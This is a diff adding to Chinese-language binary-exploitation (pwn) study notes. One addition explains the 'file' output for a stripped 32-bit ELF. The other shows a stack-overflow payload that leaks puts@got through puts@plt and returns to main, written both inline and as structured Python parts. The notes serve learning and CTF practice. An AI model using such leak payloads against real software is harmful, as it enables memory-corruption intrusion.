@@ -175,6 +175,13 @@ SP与BP:	栈顶对应ida中低地址为栈顶;高地址为栈底。
 
 
 
+### file命令分析：
+
+`yu@pwn:~/桌面$ file /home/yu/桌面/pwn
+/home/yu/桌面/pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6a8aa744920dda62e84d44fcc440c05f31c4c23d, stripped`
+
+通过file指令可以对程序进行一些信息搜集，其中最主要的几个就是，**32-bit**表示程序是32位的。后面跟着**LSB**表示程序为小端序，这个dynamically就是指程序为动态链接引入了libc，后面还有内核**for GNU/Linux 3.2.0**，最后 **stripped** 这个表示程序去除了符号，虽然在ida里面能看见一些常见的符号，但是我们直接的b main就失效了。
+
 
 
 ---
@@ -909,7 +916,37 @@ MSB与LSB，假设我们有一串数字1234，我们的起始地址为0x1000
 
 
 
+### 额外的写法：
 
+**payload_leak = b'0' * 9 + p32(0) + p32(plt_puts) + p32(main_addr) + p32(got_puts) + b'\n'**	#正常版
+
+```
+payload_leak_parts = [
+
+  ('pad', leak_pad),
+
+  ('saved_ebp', leak_saved_ebp),
+
+  ('ret=puts@plt', leak_ret),
+
+  ('next=main', leak_next),
+
+  ('arg=puts@got', leak_arg),
+
+  ('newline', leak_nl),
+
+]
+
+payload_leak = b''.join(chunk for _, chunk in payload_leak_parts)
+
+describe_payload('payload_leak', payload_leak_parts)
+```
+
+用结构化的高级写法，不需要我们一个一个强调转化二进制数据流。
+
+**describe_payload('payload_leak', payload_leak_parts)**	#这个也是高级的可视化发送payload操作与一个自定义发送函数搭配，完成类似这样的明了的payload数据发送。
+
+![image-20260324203415946](/images/image-20260324203415946.png)
 
 
 
